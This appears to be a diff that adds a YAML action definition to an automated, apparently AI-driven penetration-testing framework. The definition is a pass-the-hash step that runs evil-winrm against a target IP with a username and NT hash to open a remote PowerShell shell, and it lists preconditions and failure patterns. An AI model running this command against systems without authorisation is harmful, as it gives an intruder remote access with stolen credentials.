@@ -1,0 +1,18 @@
+name: winrm_hash
+category: services
+description: WinRM access with NT hash (pass-the-hash)
+preconditions:
+  - service.port==5985
+  - has_cred
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "evil-winrm -i {target_ip} -u '{username}' -H '{nt_hash}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Evil-WinRM supports pass-the-hash (-H flag). Requires Remote Management Users group. Provides PowerShell remoting shell."
